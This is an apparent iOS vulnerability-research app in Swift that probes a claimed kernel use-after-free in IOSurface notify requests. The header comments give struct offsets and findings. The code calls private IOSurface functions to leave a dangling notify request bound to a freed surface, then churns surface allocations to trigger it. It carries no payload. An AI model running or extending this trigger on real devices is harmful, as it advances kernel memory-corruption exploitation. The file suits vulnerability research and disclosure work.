// AGXProbe v95 - CVE-2026-112477: notify-request lifetime vs object lifetime
//
// Confirmed on the 13 Pro (v94):
//   register notify on surface A, release A, then remove(stale_id) -> OK
//   => the IOSurfaceNotifyRequest is NOT unlinked when the surface dies.
//
// Static model (com.apple.iokit.IOSurface, 24A446):
//   request +0x58 = the object the request is bound to (client / surface)
//   request survives -> later dispatch dereferences +0x58 (lock +0xd8,
//   array +0x108, count +0x110, tag +0x118) -> UAF if that object was freed.
//
// v95 goals:
//   1. no double release (v94 bug)
//   2. three notify ports so each request can be identified by the message it gets
//   3. trigger teardown events and see whether a notification is delivered
//   4. check what happens when the bound object is gone

import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v95 - notify request lifetime").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v95")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v95 - notify request lifetime ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }

        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        func makeSurface(w: Int, h: Int) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = w
            props["IOSurfaceHeight"] = h
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }
        func krName(_ kr: kern_return_t) -> String {
            switch kr {
            case KERN_SUCCESS: return "OK"
            case Int32(bitPattern: 0xe00002bd): return "NoMemory"
            case Int32(bitPattern: 0xe00002c2): return "BadArgument"
            case Int32(bitPattern: 0xe00002c9): return "Duplicate/Exists"
            case Int32(bitPattern: 0xe00002d8): return "NotAttached(27.2 guard)"
            default: return String(format: "0x%08x", UInt32(bitPattern: kr))
            }
        }

        var ports: [mach_port_t] = []
        for i in 0..<3 {
            var p: mach_port_t = 0
            let kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)
            emit("[*] port[\(i)] 0x\(String(p, radix: 16)) kr=\(krName(kr))")
            ports.append(p)
        }
        let pStale = ports[0], pLive = ports[1], pProbe = ports[2]

        func drain(_ tag: String) {
            for (i, port) in ports.enumerated() {
                var buf = [UInt8](repeating: 0, count: 4096)
                let r = buf.withUnsafeMutableBytes { raw -> kern_return_t in
                    let hdr = raw.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self)
                    return mach_msg(hdr, MACH_RCV_TIMEOUT, 0, 4096, mach_port_name_t(port), 300, 0)
                }
                if r == KERN_SUCCESS {
                    let hdr = UnsafeRawPointer(buf).assumingMemoryBound(to: mach_msg_header_t.self).pointee
                    let bytes = buf.prefix(32).map { String(format: "%02x", $0) }.joined()
                    emit("[\(tag)] port[\(i)] MSG size=\(hdr.msgh_size) id=\(hdr.msgh_id) bytes=\(bytes)")
                }
            }
        }

        // ---- Phase 1: request vs surface lifetime ---------------------------
        emit("\n=== Phase 1: request survives the surface? ===")
        guard let sA = makeSurface(w: 64, h: 64) else { emit("[-] create A failed"); status = "Complete"; isRunning = false; return }
        let idA = gGetID(sA)
        emit("[A] id 0x\(String(idA, radix: 16))")
        emit("[A] set_notify(port0) -> \(krName(gSet(pStale, 1, UInt64(idA))))")
        releaseSurf(sA)
        emit("[A] released")

        // control: live surface with its own port
        guard let sB = makeSurface(w: 96, h: 96) else { emit("[-] create B failed"); status = "Complete"; isRunning = false; return }
        let idB = gGetID(sB)
        emit("[B] id 0x\(String(idB, radix: 16)) set_notify(port1) -> \(krName(gSet(pLive, 1, UInt64(idB))))")

        // a request explicitly on the stale id, with a third port
        emit("[S] set_notify(port2, stale id) -> \(krName(gSet(pProbe, 1, UInt64(idA))))")

        emit("[P1] remove(stale id) -> \(krName(gRemove(UInt64(idA))))")
        emit("[P1] remove(live  id) -> \(krName(gRemove(UInt64(idB))))")

        // ---- Phase 2: trigger events, look for notifications -----------------
        emit("\n=== Phase 2: event triggers ===")
        drain("P2-init")
        var freed = 0
        for i in 0..<120 {
            if let s = makeSurface(w: 64 + (i % 9) * 8, h: 64 + (i % 5) * 8) {
                _ = gGetID(s)
                releaseSurf(s)
                freed += 1
            }
            if i % 30 == 29 { drain("P2-\(i)") }
        }
        emit("[P2] freed \(freed) surfaces")
        drain("P2-end")

        // ---- Phase 3: teardown of the live control surface -------------------
        emit("\n=== Phase 3: control surface teardown ===")
        releaseSurf(sB)
        emit("[P3] released live surface id 0x\(String(idB, radix: 16))")
        drain("P3")
        emit("[P3] remove(live id) after teardown -> \(krName(gRemove(UInt64(idB))))")
        emit("[P3] remove(stale id) -> \(krName(gRemove(UInt64(idA))))")

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }

    private func releaseSurf(_ p: UnsafeMutableRawPointer?) {
        guard let p = p else { return }
        Unmanaged<AnyObject>.fromOpaque(p).release()
    }
}

// mach_task_self is not exposed by the Darwin module on iOS
@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
